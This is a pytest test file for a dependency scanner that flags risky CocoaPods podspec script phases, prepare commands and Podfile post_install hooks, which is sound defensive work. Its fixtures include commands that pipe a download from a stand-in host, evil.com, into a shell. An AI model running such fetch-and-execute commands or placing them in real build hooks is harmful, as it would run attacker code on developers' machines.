"""Tests for CocoaPodsHookScanner — podspec script_phase + Podfile hook detection."""

from __future__ import annotations

import asyncio

import pytest

from depfence.scanners.cocoapods_hook_scanner import CocoaPodsHookScanner


@pytest.fixture
def scanner():
    return CocoaPodsHookScanner()


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


PODSPEC_WITH_SCRIPT_PHASE = """\
Pod::Spec.new do |s|
  s.name         = 'EvilPod'
  s.version      = '1.0.0'
  s.script_phase = { :name => 'Run Script', :script => 'curl evil.com | sh' }
end
"""

PODSPEC_WITH_PREPARE_COMMAND = """\
Pod::Spec.new do |s|
  s.name            = 'ShadyPod'
  s.version         = '2.0.0'
  s.prepare_command = 'make && ./configure'
end
"""

PODSPEC_CLEAN = """\
Pod::Spec.new do |s|
  s.name         = 'SafePod'
  s.version      = '1.0.0'
  s.source_files = 'Sources/**/*.swift'
end
"""

PODFILE_DANGEROUS = """\
platform :ios, '15.0'
target 'MyApp' do
  pod 'Alamofire'
end

post_install do |installer|
  system('curl https://evil.com/payload.sh | sh')
end
"""

PODFILE_CLEAN = """\
platform :ios, '15.0'
target 'MyApp' do
  pod 'Alamofire'
  pod 'SDWebImage'
end
"""


class TestPodspecScriptPhase:
    def test_script_phase_flagged(self, scanner, tmp_path):
        (tmp_path / "EvilPod.podspec").write_text(PODSPEC_WITH_SCRIPT_PHASE)
        findings = run(scanner.scan_project(tmp_path))
        cp01 = [f for f in findings if "CP-01" in f.title]
        assert len(cp01) >= 1

    def test_dangerous_shell_in_podspec(self, scanner, tmp_path):
        (tmp_path / "EvilPod.podspec").write_text(PODSPEC_WITH_SCRIPT_PHASE)
        findings = run(scanner.scan_project(tmp_path))
        critical = [f for f in findings if f.severity.value == "critical"]
        assert len(critical) >= 1

    def test_prepare_command_flagged(self, scanner, tmp_path):
        (tmp_path / "ShadyPod.podspec").write_text(PODSPEC_WITH_PREPARE_COMMAND)
        findings = run(scanner.scan_project(tmp_path))
        cp03 = [f for f in findings if "CP-03" in f.title]
        assert len(cp03) == 1

    def test_clean_podspec_no_findings(self, scanner, tmp_path):
        (tmp_path / "SafePod.podspec").write_text(PODSPEC_CLEAN)
        findings = run(scanner.scan_project(tmp_path))
        assert findings == []


class TestPodfileHooks:
    def test_dangerous_post_install_flagged(self, scanner, tmp_path):
        (tmp_path / "Podfile").write_text(PODFILE_DANGEROUS)
        findings = run(scanner.scan_project(tmp_path))
        cp02 = [f for f in findings if "CP-02" in f.title]
        assert len(cp02) >= 1

    def test_clean_podfile_no_findings(self, scanner, tmp_path):
        (tmp_path / "Podfile").write_text(PODFILE_CLEAN)
        findings = run(scanner.scan_project(tmp_path))
        assert findings == []


class TestEmpty:
    def test_no_pods_no_findings(self, scanner, tmp_path):
        findings = run(scanner.scan_project(tmp_path))
        assert findings == []
